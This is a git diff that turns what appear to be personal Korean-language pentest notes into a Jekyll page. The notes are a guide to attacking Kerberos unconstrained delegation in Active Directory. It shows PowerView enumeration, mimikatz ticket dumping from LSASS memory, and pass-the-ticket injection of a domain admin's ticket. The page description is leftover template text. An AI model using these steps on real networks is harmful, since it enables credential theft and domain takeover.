@@ -1,4 +1,14 @@
+---
+layout: page
+title: AllowedToDelegate
+description: >
+  This chapter covers the basics of content creation with Hydejack.
+hide_description: true
+sitemap: false
+---
 
+0. this unordered seed list will be replaced by toc as unordered list
+{:toc}
 
 # 제한 없는 위임 (Unconstrained Delegation) 공격 가이드
 
@@ -14,9 +24,9 @@
 ---
 
 BloodHound 이용해서 식별 후 GetST로 진행해도 됨.
-[[GetST]]
+![GetST]
 
-![[Pasted image 20250804233330.png]]
+![Pasted_image_20250804233330.png](/image/Pasted_image_20250804233330.png)
 
 ---
 
@@ -29,7 +39,7 @@ BloodHound 이용해서 식별 후 GetST로 진행해도 됨.
 
 #### **PowerView를 이용한 수동 열거**
 
-```powershell(title="PowerView로 제한 없는 위임 계정 검색")
+```powershell
 # 제한 없는 위임이 설정된 컴퓨터 계정 검색
 Get-NetComputer -Unconstrained
 
@@ -46,7 +56,7 @@ Get-NetUser -Unconstrained
 2.  **관리자 인증 대기:** 도메인 관리자(DA)가 해당 서버에 어떤 방식으로든 인증하기를 기다립니다. (예: 원격 데스크톱, 파일 공유 접속, 원격 관리 등)
 
 3.  **TGT 덤프:** DA가 인증하면, 서버의 LSASS 메모리에 DA의 TGT가 저장됩니다. `mimikatz`를 사용하여 메모리에 캐시된 모든 Kerberos 티켓을 덤프합니다.
-    ```powershell(title="Mimikatz로 티켓 덤프")
+    ```powershell
     # Mimikatz 실행 후
     privilege::debug
     sekurlsa::tickets /export
@@ -56,7 +66,7 @@ Get-NetUser -Unconstrained
 4.  **DA 티켓 식별:** 생성된 `.kirbi` 파일 중 도메인 관리자 계정의 티켓을 찾습니다. (파일 이름에 사용자 이름이 포함됨)
 
 5.  **Pass-the-Ticket (PTT) 공격:** 식별된 DA의 티켓을 현재 세션에 주입합니다.
-    ```powershell(title="Mimikatz로 티켓 주입")
+    ```powershell
     kerberos::ptt C:\Temp\\\[...]-Administrator@<domain>-.kirbi
     ```
 
